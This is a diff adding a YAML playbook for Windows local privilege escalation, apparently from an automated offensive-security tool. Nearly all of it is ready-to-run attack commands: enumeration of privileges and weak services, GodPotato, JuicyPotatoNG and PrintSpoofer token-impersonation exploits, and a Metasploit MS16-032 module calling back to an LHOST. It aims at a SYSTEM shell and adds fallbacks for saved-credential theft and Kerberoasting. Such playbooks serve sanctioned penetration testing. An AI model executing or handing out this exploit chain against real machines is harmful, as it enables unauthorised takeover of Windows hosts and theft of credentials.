@@ -1,0 +1,56 @@
+id: privesc_windows_potato
+title: "Windows local privesc — Potato family + service abuse"
+phase: privesc
+mitre: ["T1134.001", "T1068", "T1543.003"]
+trigger:
+  services: []
+  ports:    []
+  os_any:   ["windows", "windows server", "win10", "win11"]
+  technologies: []
+  cves:     ["CVE-2020-1472", "CVE-2021-1675", "CVE-2021-34527"]
+keywords:
+  - "windows privesc"
+  - "juicy potato"
+  - "rotten potato"
+  - "godpotato"
+  - "printnightmare"
+  - "se-impersonate"
+  - "winpeas"
+  - "powerup"
+preconditions:
+  - "Foothold as IIS / SQLSvr / NetworkService / LocalService account (SeImpersonatePrivilege present)"
+  - "OR Foothold as user member of unprivileged group with file-write to a service binary"
+steps:
+  - tool: powershell
+    cmd:  "whoami /priv; whoami /groups; net user; systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'Hotfix'"
+    why:  "Snapshot privileges, groups, OS build, KBs — drives exploit choice"
+  - tool: powershell
+    cmd:  "Get-Service | where {$_.Status -eq 'Running'}; Get-WmiObject win32_service | select Name,PathName,StartName,State"
+    why:  "Find services with unquoted paths or weak ACLs"
+  - tool: powershell
+    cmd:  "Get-Acl 'HKLM:\\System\\CurrentControlSet\\Services\\*' | where {$_.AccessToString -match 'Everyone Allow FullControl'}"
+    why:  "AlwaysInstallElevated, weak service registry ACLs"
+  - tool: winpeas
+    cmd:  "winPEASx64.exe quiet"
+    why:  "Comprehensive enum — token-impersonation, weak services, AutoLogon creds, group policy passwords"
+  - tool: godpotato
+    cmd:  "GodPotato.exe -cmd 'cmd.exe /c whoami'"
+    why:  "Server 2016/2019/2022 + Win 10/11 — universal SeImpersonate → SYSTEM (post-2022 patches)"
+  - tool: juicypotato_ng
+    cmd:  "JuicyPotatoNG.exe -t * -p 'C:\\Windows\\System32\\cmd.exe' -a '/c whoami'"
+    why:  "JuicyPotatoNG — works on patched COM-CLSIDs + Win Server 2019"
+  - tool: printspoofer
+    cmd:  "PrintSpoofer.exe -i -c 'cmd.exe'"
+    why:  "Server 2016/2019 with Print Spooler running"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION 1; set LHOST {LHOST}; set LPORT {LPORT}; run'"
+    why:  "MS16-032 — older builds (Win 7/2008/8/2012) without SeImpersonate"
+expected_outcome: "NT AUTHORITY\\SYSTEM shell"
+fallbacks:
+  - "If no SeImpersonate + no kernel exploit → check for AutoLogon creds in registry"
+  - "Always check ``cmdkey /list`` and ``runas /savecred`` — vendor scripts leak"
+  - "Domain-joined? Pivot to T1558 (Kerberoast) instead of going up locally"
+references:
+  - "https://github.com/BeichenDream/GodPotato"
+  - "https://github.com/antonioCoco/JuicyPotatoNG"
+  - "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
